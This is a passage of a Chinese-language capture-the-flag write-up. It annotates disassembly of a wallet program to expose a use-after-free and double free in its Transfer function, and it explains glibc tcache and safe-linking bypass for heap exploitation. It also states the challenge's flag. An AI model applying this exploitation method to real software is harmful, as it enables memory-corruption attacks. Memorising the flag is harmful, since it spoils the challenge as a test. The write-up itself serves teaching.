   +0x2c  (4 bytes padding)
\end{Verbatim}

\subparagraph{\texorpdfstring{slot
表（\texttt{struct\ \allowbreak{}wallet\ \allowbreak{}*slots{[}16{]}}）}{slot 表（struct wallet *slots{[}16{]}）}}\label{slot-ux8868struct-wallet-slots16}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
位址 0x4040c0 ─┬─ slots[0]  0x4040c0
               ├─ slots[1]  0x4040c8
               ├─ ...
               └─ slots[15] 0x404138   （表尾 0x404140）
\end{Verbatim}

16 個 8-byte 指標，就在 \texttt{.\allowbreak{}bss} 裡，\textbf{non-PIE
所以位址固定}。

\paragraph{\texorpdfstring{4.4
\texttt{Deposit}（0x4017d0）：\textbf{可控制長度的任意讀寫雛型}}{4.4 Deposit（0x4017d0）：可控制長度的任意讀寫雛型}}\label{deposit0x4017d0ux53efux63a7ux5236ux9577ux5ea6ux7684ux4efbux610fux8b80ux5bebux96dbux578b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
4017d0: endbr64
4017d4: push   rbx
4017d5: lea    rdi,[rip+0xd69]        # 402545 "Deposit into which wallet?"
4017dc: call   401510                 ← index = read_int(prompt)
4017e1: test   eax,eax
4017e3: js     40184a                 ← 負數（= invalid）→ 直接 pop/ret
4017e5: cdqe
4017e7: lea    rdx,[rip+0x28d2]       # 4040c0
4017ee: mov    rbx,QWORD PTR [rdx+rax*8]      ← rbx = slots[index]
4017f2: test   rbx,rbx
4017f5: je     401850                 ← NULL → "[!] That wallet is not active."
4017f7: mov    eax,DWORD PTR [rbx+0x28]
4017fa: test   eax,eax
4017fc: je     401850                 ← active == 0 → 同上
4017fe: cmp    QWORD PTR [rbx+0x18],0x0
401803: je     401888                 ← ledger == NULL → "has no ledger"
401809: mov    rcx,QWORD PTR [rbx+0x20]        ← 參數：size
40180d: mov    rdx,rbx                         ← 參數：wallet 指標（當 %s 用）
401810: lea    rsi,[rip+0x9e9]                 # 402200 "    Depositing into \"%s\" (ledger: %zu bytes)\n"
401817: xor    eax,eax
401819: mov    edi,0x2
40181e: call   4011b0 <__printf_chk@plt>
401823: lea    rsi,[rip+0xd36]                 # 402560 "    Enter transaction data: "
40182a: mov    edi,0x2
40182f: xor    eax,eax
401831: call   4011b0 <__printf_chk@plt>       ← printf("    Enter transaction data: ")
401836: mov    rdx,QWORD PTR [rbx+0x20]        ← ✶ 長度 = wallet->size
40183a: mov    rsi,QWORD PTR [rbx+0x18]        ← ✶ 目的地 = wallet->ledger
40183e: xor    edi,edi                         ← fd = 0 (stdin)
401840: call   401160 <read@plt>               ← ✶✶ read(0, ledger, size)
401845: test   rax,rax
401848: jg     401860
40184a: pop    rbx
40184b: ret                                    ← read() 回 <= 0（EOF）就直接返回
401850: lea    rdi,[rip+0x959]                 # 4021b0 "[!] That wallet is not active."
401857: pop    rbx
401858: jmp    401120 <puts@plt>
401860: mov    rcx,QWORD PTR [rbx+0x10]        ← balance
401864: mov    rdx,rax                         ← 第 3 參數 n = 實際讀到幾個 byte
401867: mov    edi,0x2
40186c: lea    rsi,[rip+0x9bd]                 # 402230 "[+] Deposited %zd bytes. New balance: %lu\n"
401873: add    rcx,rax
401876: xor    eax,eax
401878: mov    QWORD PTR [rbx+0x10],rcx        ← balance += n
40187c: pop    rbx
40187d: jmp    4011b0 <__printf_chk@plt>       ← 尾呼叫印 "[+] Deposited ..."
401888: lea    rdi,[rip+0x941]                 # 4021d0 "[!] Wallet has no ledger..."
40188f: pop    rbx
401890: jmp    401120 <puts@plt>
\end{Verbatim}

\textbf{這支函式的重點}： - 它讀寫的位置與長度完全由
\texttt{wallet-\allowbreak{}\textgreater{}\allowbreak{}ledger} 與
\texttt{wallet-\allowbreak{}\textgreater{}\allowbreak{}size} 決定。 - 如果我們能讓某個 wallet 的
\texttt{ledger} 指向 \textbf{slot 表}、\texttt{size} = 0x20， 那 Deposit
就變成「把 32 bytes 寫進 slot 表」→ 之後就能用假 wallet 為所欲為。 -
\textbf{它是唯一使用 raw \texttt{read(0,\allowbreak{}\ \allowbreak{}...)} 的操作}（其他都是
\texttt{fgets}）------這是後面 pipelining 大坑的來源。

\paragraph{\texorpdfstring{4.5
\texttt{Withdraw}（0x4018a0）：\textbf{任意讀}}{4.5 Withdraw（0x4018a0）：任意讀}}\label{withdraw0x4018a0ux4efbux610fux8b80}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
4018a0: endbr64
4018a4: push   rbx
4018a5: mov    edi,0x2
4018aa: mov    ecx,0xf
4018af: lea    rdx,[rip+0xcc7]        # 40257d "Withdraw from which wallet?"
4018b6: lea    rsi,[rip+0xc3d]        # 4024fa "%s (0-%d): "
4018bd: sub    rsp,0x30                ← 開 0x30（不是 0x20）
4018c1: mov    rax,QWORD PTR fs:0x28   ← canary
4018ca: mov    QWORD PTR [rsp+0x28],rax
4018cf: xor    eax,eax
4018d1: mov    rbx,rsp
4018d4: call   4011b0 <__printf_chk@plt>   ← 印 prompt
4018d9: mov    rdx,QWORD PTR [rip+0x27b0]  # 404090 = stdin
4018e0: mov    esi,0x20
4018e5: mov    rdi,rbx
4018e8: call   401170 <fgets@plt>      ← fgets(rsp, 0x20, stdin)
4018ed: test   rax,rax
4018f0: je     4019b8                  ← EOF → exit(0)
4018f6: xor    esi,esi
4018f8: mov    edx,0xa
4018fd: mov    rdi,rbx
401900: call   401190 <strtol@plt>
401905: cmp    eax,0xf
401908: ja     4019e1                  ← > 15 → invalid
40190e: cdqe
401910: lea    rdx,[rip+0x27a9]        # 4040c0
401917: mov    rbx,QWORD PTR [rdx+rax*8]    ← rbx = slots[index]
40191b: test   rbx,rbx
40191e: je     401990                  ← 未使用
401920: mov    eax,DWORD PTR [rbx+0x28]
401923: test   eax,eax
401925: je     401990                  ← not active
401927: cmp    QWORD PTR [rbx+0x18],0x0
40192c: je     4019c0                  ← 沒有 ledger
401932: mov    rcx,QWORD PTR [rbx+0x20]     ← size
401936: mov    rdx,rbx
401939: lea    rsi,[rip+0x920]              # 402260 "[+] Ledger contents for \"%s\" (%zu bytes):\n    "
401940: xor    eax,eax
401942: mov    edi,0x2
401947: call   4011b0 <__printf_chk@plt>
40194c: mov    rdx,QWORD PTR [rbx+0x20]     ← ✶ 長度 = wallet->size
401950: mov    rsi,QWORD PTR [rbx+0x18]     ← ✶ 來源 = wallet->ledger
401954: mov    edi,0x1                       ← fd = 1 (stdout)
401959: call   401130 <write@plt>           ← ✶✶ write(1, ledger, size)
40195e: mov    rax,QWORD PTR [rsp+0x28]
401963: sub    rax,QWORD PTR fs:0x28        ← canary 檢查
40196c: jne    401a02 <__stack_chk_fail@plt>
401972: mov    rdx,QWORD PTR [rbx+0x10]      ← 第 3 參數 balance
401976: add    rsp,0x30
40197a: lea    rsi,[rip+0xc32]              # 4025b3 "\n[+] Current balance: %lu\n"
401981: xor    eax,eax
401983: mov    edi,0x2
401988: pop    rbx
401989: jmp    4011b0 <__printf_chk@plt>    ← 尾呼叫印 "\n[+] Current balance: ..."
\end{Verbatim}

\textbf{Withdraw 是完美的資訊洩漏管道}：長度可到
\texttt{0x100}，而且\textbf{它不檢查 ledger 是否已被 free}。

\paragraph{\texorpdfstring{4.6
\texttt{Transfer}（0x401a10）：\textbf{漏洞就在這裡}}{4.6 Transfer（0x401a10）：漏洞就在這裡}}\label{transfer0x401a10ux6f0fux6d1eux5c31ux5728ux9019ux88e1}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
401a10: endbr64
401a14: push   rbp
401a15: lea    rdi,[rip+0xbb2]        # 4025ce "Transfer FROM which wallet?"
401a1c: push   rbx
401a1d: sub    rsp,0x8
401a21: call   401510                 ← read_int
401a26: test   eax,eax
401a28: js     401aa0                 ← 取消
401a2a: lea    rbp,[rip+0x268f]       # 4040c0  ← rbp = slot 表
401a31: cdqe
401a33: mov    rbx,QWORD PTR [rbp+rax*8]    ← ✶ rbx = src wallet
401a38: test   rbx,rbx
401a3b: je     401a88                  ← NULL → "Source wallet is not active."
401a3d: mov    edx,DWORD PTR [rbx+0x28]
401a40: test   edx,edx
401a42: je     401a88                  ← src->active == 0 → 同上
401a44: cmp    QWORD PTR [rbx+0x18],0x0
401a49: je     401b40                  ← src->ledger == NULL
401a4f: lea    rdi,[rip+0xb94]        # 4025ea "Transfer TO which wallet?"
401a56: call   401510                 ← read_int
401a5b: test   eax,eax
401a5d: js     401aa0
401a5f: cdqe
401a61: mov    rbp,QWORD PTR [rbp+rax*8]    ← ✶ rbp = dst wallet
401a66: test   rbp,rbp
401a69: je     401a72                  ← NULL → "Destination wallet is not active."
401a6b: mov    eax,DWORD PTR [rbp+0x28]
401a6e: test   eax,eax
401a70: jne    401ab0                  ← dst->active != 0 才繼續
401a72: add    rsp,0x8
401a76: lea    rdi,[rip+0x86b]        # 4022e8 "[!] Destination wallet is not active."
401a7d: pop    rbx
401a7e: pop    rbp
401a7f: jmp    401120 <puts@plt>
401ab0: mov    rcx,rbp                 ← 參數：dst
401ab3: mov    rdx,rbx                 ← 參數：src
401ab6: lea    rsi,[rip+0x853]        # 402310 "[*] Transferring ledger from \"%s\" to \"%s\"...\n"
401abd: xor    eax,eax
401abf: mov    edi,0x2
401ac4: call   4011b0 <__printf_chk@plt>

401ac9: mov    rdi,QWORD PTR [rbx+0x18]   ← rdi = src->ledger
401acd: call   401110 <free@plt>          ← ✶✶✶ 把 src 的 ledger 釋放掉

401ad2: mov    rax,QWORD PTR [rbx+0x18]   ← ✶✶✶ 重新讀 src->ledger
                                          ← free() 不會把 src->ledger 清成 NULL，
                                             所以 rax 現在是「已經被 free 的指標」
401ad6: mov    rcx,rbp
401ad9: mov    rdx,rbx
401adc: mov    edi,0x2
401ae1: lea    rsi,[rip+0x858]            # 402340 "[+] Transfer complete. \"%s\" closed. \"%s\" balance: %lu\n"
401ae8: mov    QWORD PTR [rbp+0x18],rax   ← ✶✶✶✶ dst->ledger = 剛剛 free 掉的指標！
401aec: mov    rax,QWORD PTR [rbx+0x20]
401af0: mov    QWORD PTR [rbp+0x20],rax   ← dst->size = src->size
401af4: mov    rax,QWORD PTR [rbx+0x10]
401af8: add    QWORD PTR [rbp+0x10],rax   ← dst->balance += src->balance
401afc: xor    eax,eax
401afe: mov    QWORD PTR [rbx+0x10],0x0   ← src->balance = 0
401b06: mov    r8,QWORD PTR [rbp+0x10]    ← 第 5 個參數 = dst->balance
401b0a: mov    QWORD PTR [rbx+0x18],0x0   ← src->ledger = NULL
401b12: mov    QWORD PTR [rbx+0x20],0x0   ← src->size   = 0
401b1a: mov    DWORD PTR [rbx+0x28],0x0   ← src->active = 0（清得很乾淨）
401b21: call   4011b0 <__printf_chk@plt>  ← 印 "[+] Transfer complete..."
401b26: add    rsp,0x8
401b2a: lea    rdi,[rip+0x847]            # 402378 "    All assets have been consolidated..."
401b31: pop    rbx
401b32: pop    rbp
401b33: jmp    401120 <puts@plt>
\end{Verbatim}

\textbf{看出問題了嗎？}

\texttt{src}（來源）被清得非常乾淨（ledger=NULL、size=0、active=0）， 但
\textbf{\texttt{dst}（目的）卻拿到了一個「已經被 free 的指標」}！

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   Transfer(A -> B) 之後：

   A: ledger = NULL, size = 0, active = 0        （乾淨）
   B: ledger = <A 原本的 ledger，但已被 free>     （✶ 懸空指標 dangling pointer）
      size   = A 原本的 size
      active = 1
\end{Verbatim}

也就是說 \textbf{B 這個 wallet 還「活著」，但它指向的 chunk 已經被 glibc
回收了}。於是：

\begin{itemize}
\tightlist
\item
  \textbf{\texttt{Withdraw(B)}} →
  \texttt{write(1,\allowbreak{}\ \allowbreak{}被釋放的\ \allowbreak{}chunk,\allowbreak{}\ \allowbreak{}size)} → \textbf{UAF
  讀取（資訊洩漏）}
\item
  \textbf{\texttt{Deposit(B)}} →
  \texttt{read(0,\allowbreak{}\ \allowbreak{}被釋放的\ \allowbreak{}chunk,\allowbreak{}\ \allowbreak{}size)} → \textbf{UAF 寫入（可改寫
  tcache 的 metadata）}
\item
  \textbf{再對 B 做一次 \texttt{Transfer(B\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}C)}} →
  會對「已經 free 的指標」再 free 一次 → \textbf{double free}
\end{itemize}

\textbf{漏洞精確定義（一句話）：\texttt{Transfer} 把 \texttt{free()}
過的指標存進目的 wallet， 造成 use-after-free
read/write，並且可以連鎖觸發 double free。}

\paragraph{\texorpdfstring{4.7 \texttt{Close} / \texttt{List}（0x401b60
/ 0x401c90）---
這兩個是乾淨的}{4.7 Close / List（0x401b60 / 0x401c90）--- 這兩個是乾淨的}}\label{close-list0x401b60-0x401c90-ux9019ux5169ux500bux662fux4e7eux6de8ux7684}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
Close Wallet：
  rbx = slots[index]；若 NULL → "[!] No wallet in that slot."
  free(wallet->ledger)         ← 有 free
  free(wallet)                 ← 連結構也 free
  slots[index] = 0             ← 有清 NULL
\end{Verbatim}

\texttt{Close} 完全正確（沒有
UAF），所以我們\textbf{不要用它來製造漏洞}； 但可以用它來「正常地把
chunk 塞進 tcache」（Phase 1 需要）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. glibc heap
從零教起}\label{glibc-heap-ux5f9eux96f6ux6559ux8d77}

\paragraph{5.1 chunk 的長相}\label{chunk-ux7684ux9577ux76f8}

\texttt{malloc(0x80)} 真正拿到的是一塊 \textbf{0x90 bytes 的 chunk}（多
0x10 的 header、16 bytes 對齊）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
                chunk 位址 = malloc 回傳值 - 0x10
   ┌─────────────────────────┐ ← 低位址
   │ prev_size  (8 bytes)    │   前一個 chunk 若「正在使用」→ 這格會被前一個 chunk 當資料用
   ├─────────────────────────┤
   │ size       (8 bytes)    │   這個 chunk 的總大小（含 header），例如 0x91
   ├─────────────────────────┤ ← malloc 回傳的指標（user data 起點）
   │                         │
   │   user data (0x80 B)    │   ✶ 我們能寫的範圍
   │                         │
   ├─────────────────────────┤
   │ prev_size  (下一個)     │   下一個 chunk 的 header
   │ size       (下一個)     │
   └─────────────────────────┘
\end{Verbatim}

\textbf{被 free 之後（進到 tcache）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   ┌─────────────────────────┐
   │ prev_size               │
   ├─────────────────────────┤
   │ size                    │
   ├─────────────────────────┤ ← user data 起點（被 glibc 拿來當 tcache_entry）
   │ next (8 bytes, fd)      │ = (這一格自己的位址 >> 12) XOR (下一個 free chunk 的 user 位址)
   │                         │   ↑ 也就是 (user 位址 >> 12) ^ 下一個；✶ 不是 chunk 標頭位址
   ├─────────────────────────┤
   │ key  (8 bytes)          │ = tcache_key（glibc 2.34+ 是每次執行隨機的 64-bit 值）
   ├─────────────────────────┤
   │ 之後是舊資料（不會被清）│
   └─────────────────────────┘
\end{Verbatim}

\begin{quote}
\textbf{關鍵：free 之後 \texttt{size}
欄位仍然存在，\texttt{next}/\texttt{key} 才被寫入。 所以 UAF 讀取會讀到
\texttt{next} 與 \texttt{key}------這就是我們的 leak 來源。}
\end{quote}

\paragraph{\texorpdfstring{5.2 \texttt{size} 欄位與三個 flag
bit}{5.2 size 欄位與三個 flag bit}}\label{size-ux6b04ux4f4dux8207ux4e09ux500b-flag-bit}

\texttt{size} 一定是 16 的倍數，所以最低 3 bits 被借去當旗標：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   size = 0x91 = 0b1001_0001
                         │││
                         │ │└─ bit0  PREV_INUSE (P)   = 1：前一個 chunk 正在使用（不能被合併）
                           │└── bit1  IS_MMAPPED  (M)   = 1：這塊是 mmap 來的（不是 heap）
                         └─── bit2  NON_MAIN_ARENA (A)= 1：屬於非主 arena（thread arena）
\end{Verbatim}

實際大小要用 \texttt{size\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}\textasciitilde{}\allowbreak{}0x7} 算，glibc 的巨集叫
\texttt{chunksize(p)}。 本題 gdb 看到的例子： - wallet 結構
\texttt{calloc(1,\allowbreak{}0x30)} → \texttt{size\ \allowbreak{}=\ \allowbreak{}0x41}（0x40 \textbar{}
PREV\_INUSE） - ledger \texttt{malloc(0x80)} → \texttt{size\ \allowbreak{}=\ \allowbreak{}0x91} -
\textbf{當 S 的 ledger 被 free 進 unsorted bin 時，緊接在後的 D 結構
\texttt{size} 從 \texttt{0x41} 變成 \texttt{0x40}}（free 清掉了下一個
chunk 的 PREV\_INUSE）。

\paragraph{5.3 tcache：glibc 2.26
之後的超快取（本題的主戰場）}\label{tcacheglibc-2.26-ux4e4bux5f8cux7684ux8d85ux5febux53d6ux672cux984cux7684ux4e3bux6230ux5834}

\textbf{tcache（thread cache）}
是「每個執行緒一份」的小型回收桶，\texttt{free} 會優先丟這裡，
\texttt{malloc}
也會優先從這裡拿------速度超快，\textbf{而且幾乎不做檢查}（歷史上很多漏洞都靠它）。

\begin{itemize}
\tightlist
\item
  每個「大小」有自己的一條 \textbf{LIFO 單向鏈結串列}（後進先出）。
  大小以 16 bytes 為一級：0x20、0x30、0x40、\ldots、0x410，共 64
  條（\texttt{TCACHE\_\allowbreak{}MAX\_\allowbreak{}BINS\ \allowbreak{}=\ \allowbreak{}64}）。
\item
  每條鏈最多放 \textbf{7 個}
  chunk（\texttt{mp\_\allowbreak{}.\allowbreak{}tcache\_\allowbreak{}count\ \allowbreak{}=\ \allowbreak{}7}）。 超過 7
  個時，\texttt{free} 會\textbf{往下走}正常的釋放流程（fastbin /
  unsorted bin）。
\item
  \texttt{tcache\_\allowbreak{}perthread\_\allowbreak{}struct} 就是「管理這 64
  條鏈」的結構，\textbf{它自己是一個 heap chunk}， 而且是程式第一次
  malloc 時配置的 → 一定在 \textbf{heap
  最開頭}（本題：\texttt{heap+0x0}，chunk 大小 0x290）。
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
tcache_perthread_struct（本題實測位置 heap_base+0x10 = 0x405010）
   offset 0x00 : uint16_t counts[64]     ← 每條鏈現在有幾個
   offset 0x80 : tcache_entry *entries[64] ← 每條鏈的頭（✶ 這裡存的是「未編碼」的真指標！）

   例：counts[7] = 7  表示「大小 0x90 的鏈已經滿了」
       entries[7] = 0x406970  ← 下一個 malloc(0x80) 會拿到的**位址**
                                （= chunk 標頭 0x406960 + 0x10；gdb 實測值）
\end{Verbatim}

\begin{quote}
※提示
\textbf{最重要的一句話：\texttt{tcache-\allowbreak{}\textgreater{}\allowbreak{}entries{[}{]}}
裡躺的是「明文」的 malloc 回傳位址（= chunk + 0x10）； 只有「chunk
內部那個 next 欄位」才是 safe-linking 編碼過的。} 所以： -
毒化時你只需要知道
\texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}（編碼用的
key），\textbf{不需要}完整的 user 位址； - 從 \texttt{entries{[}{]}}
讀到的值可以直接拿去用（不必解碼）； - 反之，從 chunk 裡 UAF 讀到的
\texttt{next} 一定要
\texttt{\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(user\ \allowbreak{}位址\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12)} 才能還原。

※ \textbf{本節的用字約定（很重要，§5.4 會用到）}： * \textbf{「chunk
位址」＝ chunk 標頭位址 ＝ \texttt{malloc()} 回傳值 − 0x10}（§5.1
的定義，glibc 內部叫 \texttt{p}）。 * \textbf{「user 位址」＝
\texttt{malloc()} 回傳值 ＝ chunk 標頭 + 0x10}（glibc 內部叫
\texttt{chunk2mem(p)}， 在 tcache 裡也叫
\texttt{e}）。\texttt{e-\allowbreak{}\textgreater{}\allowbreak{}next} 就是 user data 的前 8
bytes，所以 \textbf{\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next} 恆等於 user
位址}（不是只有鏈頭那塊）。 * \textbf{safe-linking 的 key 用的是「user
位址」}：\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}，
也就是「標頭位址 + 0x10」再
\texttt{\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}。\textbf{不是 chunk
標頭位址}（差 0x10，見 §5.4 實測）。

這也是本題
flag（\texttt{s4fe\_\allowbreak{}l1nk1ng\_\allowbreak{}w0nt\_\allowbreak{}s4ve\_\allowbreak{}y0ur\_\allowbreak{}tc4che}）的字面意思：
safe-linking 只保護「chunk 內的 next」，而 glibc 自己在
\texttt{entries{[}{]}} 幫你留了一份明文。
\end{quote}

大小 → 鏈編號：\texttt{tc\_\allowbreak{}idx\ \allowbreak{}=\ \allowbreak{}(chunk\_\allowbreak{}size\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x20)\ \allowbreak{}/\allowbreak{}\ \allowbreak{}0x10}
（\texttt{chunk\_\allowbreak{}size\ \allowbreak{}0x40\ \allowbreak{}→\ \allowbreak{}idx\ \allowbreak{}2}、\texttt{0x90\ \allowbreak{}→\ \allowbreak{}idx\ \allowbreak{}7}、\texttt{0x30\ \allowbreak{}→\ \allowbreak{}idx\ \allowbreak{}1}）

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
         tcache[0x90] (idx 7) 的鏈（LIFO）
   entries[7] ──► [chunk C3] ──next──► [chunk C2] ──next──► [chunk C1] ──next──► NULL
                   最前面（最後被 free 的）
   malloc(0x80) 會先拿到 C3；free 一個新 chunk 會被插到最前面
\end{Verbatim}

\texttt{free(chunk)} 進 tcache 時做的事（glibc 2.39）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{key  }\OperatorTok{=}\NormalTok{ tcache\_key}\OperatorTok{;}                                  \CommentTok{// 防 double free 用的標記}
\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{next }\OperatorTok{=}\NormalTok{ PROTECT\_PTR}\OperatorTok{(\&}\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{next}\OperatorTok{,}\NormalTok{ tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{entries}\OperatorTok{[}\NormalTok{idx}\OperatorTok{]);} \CommentTok{// ✶ safe{-}linking 編碼}
\NormalTok{tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{entries}\OperatorTok{[}\NormalTok{idx}\OperatorTok{]} \OperatorTok{=}\NormalTok{ e}\OperatorTok{;}                              \CommentTok{// 頭換成自己（這裡存的是明文指標）}
\NormalTok{tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{counts}\OperatorTok{[}\NormalTok{idx}\OperatorTok{]++;}                                 \CommentTok{// 計數 +1}
\end{Highlighting}
\end{Shaded}

\texttt{malloc} 從 tcache 拿：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{e }\OperatorTok{=}\NormalTok{ tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{entries}\OperatorTok{[}\NormalTok{idx}\OperatorTok{];}
\NormalTok{tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{entries}\OperatorTok{[}\NormalTok{idx}\OperatorTok{]} \OperatorTok{=}\NormalTok{ REVEAL\_PTR}\OperatorTok{(}\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{next}\OperatorTok{);}   \CommentTok{// ✶ 解碼下一個}
\NormalTok{tcache}\OperatorTok{{-}\textgreater{}}\NormalTok{counts}\OperatorTok{[}\NormalTok{idx}\OperatorTok{]{-}{-};}
\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{key }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}                                   \CommentTok{// 清掉 key}
\ControlFlowTok{return}\NormalTok{ e}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

\begin{quote}
注意 \texttt{malloc} 判斷「要不要用 tcache」的條件是
\texttt{counts{[}idx{]}\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}0}。 \textbf{這就是為什麼要
double free：讓同一條鏈裡有「兩個」指向同一個 chunk 的節點， 才有機會把
poison 的 \texttt{next} 消費掉。}
\end{quote}

\paragraph{5.4 safe-linking（glibc
2.32+）：本題標題的梗}\label{safe-linkingglibc-2.32ux672cux984cux6a19ux984cux7684ux6897}

\subparagraph{它到底在防什麼？（先講動機，才知道為什麼要這樣繞）}\label{ux5b83ux5230ux5e95ux5728ux9632ux4ec0ux9ebcux5148ux8b1bux52d5ux6a5fux624dux77e5ux9053ux70baux4ec0ux9ebcux8981ux9019ux6a23ux7e5e}

glibc 2.32 之前的 tcache 毒化\textbf{幾乎不需要知道任何位址}：
\texttt{free()} 之後 chunk 的
\texttt{fd}（\texttt{next}）是\textbf{明文}的下一個空閒 chunk 位址，
所以任何「拿到 UAF／溢寫」的人都可以直接把 \texttt{fd} 蓋成他想寫的位址
（例如 GOT、\texttt{\_\allowbreak{}\_\allowbreak{}free\_\allowbreak{}hook}、\texttt{\_\allowbreak{}\_\allowbreak{}malloc\_\allowbreak{}hook}），下一次
\texttt{malloc()} 就把那塊記憶體交給他 ------
這叫\textbf{盲打（blind）tcache poisoning}，連 heap 在哪都不用知道。
另一種更便宜的做法是\textbf{只改 \texttt{fd} 的最低 1 byte}（partial
overwrite）： heap
內的位址高位固定，改低位就能把目標移到自己想要的附近。

\textbf{safe-linking 的目的就是切斷這兩條路}：它把 \texttt{fd} 存成
「\textbf{目標位址 XOR 這一格自己的位址 \textgreater\textgreater{}
12}」。於是：

\begin{itemize}
\tightlist
\item
  不知道這一格的位址（heap 位址）→ 就算你寫了一個目標位址進去， glibc
  讀出來解密後也是\textbf{垃圾位址} → \texttt{malloc} 一碰就 abort；
\item
  只改低位 1 byte → 解密出來的高位仍是「你自己的位址」，\textbf{跳不到
  GOT}。
\end{itemize}

⇒ \textbf{攻擊前提被改成「必須先洩漏一次 heap 位址」}：先 leak 到那個
XOR key， 才能算出「要寫什麼值才會被解密成我想要的目標」。pwn4
整題就是在做這件事 （§8.2 的 \texttt{safe-\allowbreak{}linking\ \allowbreak{}key}、§7 的
\texttt{KEY\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}POISON\_\allowbreak{}SLOT}）， 而 glibc 好死不死又在
\texttt{entries{[}{]}} 留了一份明文（§5.3），所以這題才拿得到 shell。

\subparagraph{\texorpdfstring{公式（★ 注意 key 用的是 \textbf{user
位址}）}{公式（★ 注意 key 用的是 user 位址）}}\label{ux516cux5f0f-ux6ce8ux610f-key-ux7528ux7684ux662f-user-ux4f4dux5740}

glibc 2.32 之後，\texttt{tcache}/\texttt{fastbin} 鏈上的 \texttt{next}
指標\textbf{不再明文存放}，而是：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{/* glibc 的巨集（這裡用等價的簡化寫法；重點在 pos 是什麼） */}
\PreprocessorTok{\#define PROTECT\_PTR}\OperatorTok{(}\PreprocessorTok{pos}\OperatorTok{,}\PreprocessorTok{ ptr}\OperatorTok{)}\PreprocessorTok{  }\OperatorTok{((}\PreprocessorTok{pos}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\textgreater{}\textgreater{}}\PreprocessorTok{ }\DecValTok{12}\OperatorTok{)}\PreprocessorTok{ }\OperatorTok{\^{}}\PreprocessorTok{ }\OperatorTok{(}\PreprocessorTok{ptr}\OperatorTok{)}
\PreprocessorTok{\#define REVEAL\_PTR}\OperatorTok{(}\PreprocessorTok{ptr}\OperatorTok{)}\PreprocessorTok{        PROTECT\_PTR}\OperatorTok{(\&}\PreprocessorTok{ptr}\OperatorTok{,}\PreprocessorTok{ ptr}\OperatorTok{)}

\CommentTok{/* tcache\_put() 實際呼叫的是 PROTECT\_PTR(\&e{-}\textgreater{}next, tcache{-}\textgreater{}entries[idx])：}
\CommentTok{ *   pos ＝ \&e{-}\textgreater{}next ＝ 這個 next 欄位「自己」所在的位址}
\CommentTok{ *                   ＝ malloc() 回傳的 user 位址（＝ chunk 標頭 + 0x10）}
\CommentTok{ *                   ✶ 不是 chunk 標頭位址}
\CommentTok{ *   存： stored = ((u64)\&e{-}\textgreater{}next \textgreater{}\textgreater{} 12) \^{} ptr      ← 本節一律寫成 stored = safe \^{} ptr}
\CommentTok{ *   取： ptr    = ((u64)\&e{-}\textgreater{}next \textgreater{}\textgreater{} 12) \^{} stored}
\CommentTok{ *   其中 safe ＝ (u64)\&e{-}\textgreater{}next \textgreater{}\textgreater{} 12 ＝ (user 位址 \textgreater{}\textgreater{} 12)}
\CommentTok{ *   （本節以下提到「key」「safe」「chunk\textgreater{}\textgreater{}12」一律指這個 user 位址版本）*/}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※ 為什麼 \texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next} 就是 user 位址？因為在 tcache
裡 \texttt{e\ \allowbreak{}=\ \allowbreak{}(tcache\_\allowbreak{}entry\ \allowbreak{}*)\ \allowbreak{}chunk2mem(p)}，而
